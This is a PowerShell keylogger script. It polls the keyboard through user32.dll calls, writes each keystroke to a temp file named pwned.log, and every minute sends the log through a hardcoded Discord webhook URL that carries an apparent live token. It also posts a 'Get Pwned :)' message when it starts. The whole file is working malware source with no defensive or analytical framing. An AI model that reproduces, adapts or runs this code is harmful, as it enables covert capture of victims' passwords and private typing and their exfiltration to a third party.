$generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
$webhook = 'https://discord.com/api/webhooks/1099022093452062780/unLiluuQxOl6xNUbxdHmiLmiyJxivbADyriiyTpVKaGMcZD0Ni51MgGSTOlzN-XlkOMe'



#Success Message
[System.Collections.ArrayList]$embedArray1 = @()
    
    #Store embed values
    $title       = 'Get Pwned :)'
    $description1 = 'Hacked!'
     $color       = '1'
    
    #Create thumbnail object
    $thumbUrl = 'https://thumbs.gfycat.com/ApprehensiveOddballAgama-max-1mb.gif'
    $thumbnailObject = @{
    
        url = $thumbUrl
    
    }
    
    #Create embed object, also adding thumbnail
    $embedObject1 = [PSCustomObject]@{
    
        title    = $title
        description = $description1
        color      = $color
        thumbnail   = $thumbnailObject
    
    }
    
    #Add embed object to array
    $embedArray1.Add($embedObject1)
    
    #Create the payload
    $pwned = [PSCustomObject]@{
    
       embeds = $embedArray1
    
    }

Invoke-RestMethod -Uri $webhook -Body ($pwned | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose



function Webhook(){








#Create embed array
    [System.Collections.ArrayList]$embedArray = @()
    
    #Store embed values
    $title       = 'Keylogger'
    $description = [IO.File]::ReadAllText("$env:tmp/pwned.log")
     $color       = '1'
    
    #Create thumbnail object
    $thumbUrl = 'https://thumbs.gfycat.com/ApprehensiveOddballAgama-max-1mb.gif'
    $thumbnailObject = @{
    
        url = $thumbUrl
    
    }
    
    #Create embed object, also adding thumbnail
    $embedObject = [PSCustomObject]@{
    
        title    = $title
        description = $description
        color      = $color
        thumbnail   = $thumbnailObject
    
    }
    
    #Add embed object to array
    $embedArray.Add($embedObject)
    
    #Create the payload
    $payload = [PSCustomObject]@{
    
       embeds = $embedArray
    
    }
    
    #Send over payload, converting it to JSON
    Invoke-RestMethod -Uri $webhook -Body ($payload | ConvertTo-Json -Depth 4) -Method POST -ContentType 'application/json' -Verbose

      $generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
     }


# keylogger
function Keylogger($logFile="$env:temp/pwned.log") {


   # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
  


      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $generateLog = [console]::CapsLock
          
          

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
           

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($logFile, $mychar, [System.Text.Encoding]::Unicode) 
          }
          
        }
      }
      
    }
    
    
     $time = Get-Date -Format mm
     
     

      while($true)
     {
     Keylogger
     $time2 = Get-Date -Format mm
     if($time -ne $time2)
     {
         
         Webhook
         $time = $time2
      }

    }



